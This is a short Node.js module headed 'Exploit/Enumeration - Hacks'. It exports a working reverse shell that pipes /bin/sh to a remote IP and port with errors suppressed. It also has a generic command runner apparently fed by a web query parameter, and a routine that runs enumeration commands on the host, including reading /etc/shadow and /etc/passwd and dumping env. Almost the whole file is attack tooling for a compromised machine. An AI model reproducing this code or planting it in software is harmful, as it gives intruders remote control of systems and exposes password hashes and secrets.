`use strict`;

const net = require(`net`),
  cp = require(`child_process`);

/********************
 * Exploit/Enumeration - Hacks
 *******************/

/**
  * Commands that will be used to enumerate on machine
  */
const COMMANDS = {
  user: [`id`, `whoami`, `w`, `last`, `uname -a`],
  secret: [`cat /etc/shadow`, `cat /etc/passwd`, `cat /etc/passwd | cut -d: -f1`, `cat /etc/group`],
  os: [`cat /etc/issue`, `cat /etc/*-release`, `cat /proc/version`, `env`],
  app: [`ps aux`, `ps -ef`, `cat /etc/services`, `ls -alh /usr/bin/`, `ls -alh /sbin/`, `dpkg -l`]
};

/**
 * Create a Reverse Shell
 * @param {String} ip 
 * @param {Number} port 
 * @param {String} shell 
 */
const runReverseShell = (ip = `localhost`, port = 4444, shell = `/bin/sh`) => {
  const sh = cp.spawn(shell, []);
  const client = new net.Socket();

  client.connect(port, ip, () => {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  }).on(`error`, () => {});
};

/**
 * Will attempt to execute a command
 * @param {String} command 
 * @returns {Promise}
 */
const runCommand = (command = `echo Missing Query Param '?command=ls'`) =>
  new Promise((resolve) => cp.exec(command, (error, stdout, stderr) => resolve(error ? stderr : stdout)));

/**
 * Iterates through the commands and executes them
 * @returns {Object}
 */
const runCommands = async () => {
  const commands = {};

  for (const section in COMMANDS) {
    for (const command in COMMANDS[section]) {
      const std = await runCommand(COMMANDS[section][command]);
      const commandWithSTD = { [COMMANDS[section][command]]: std };
      // Rebuild Commands with STD
      (section in commands)
        ? commands[section].push(commandWithSTD)
        : commands[section] = [commandWithSTD];
    }
  }

  return commands;
};

module.exports = {
  runReverseShell,
  runCommand,
  runCommands
};
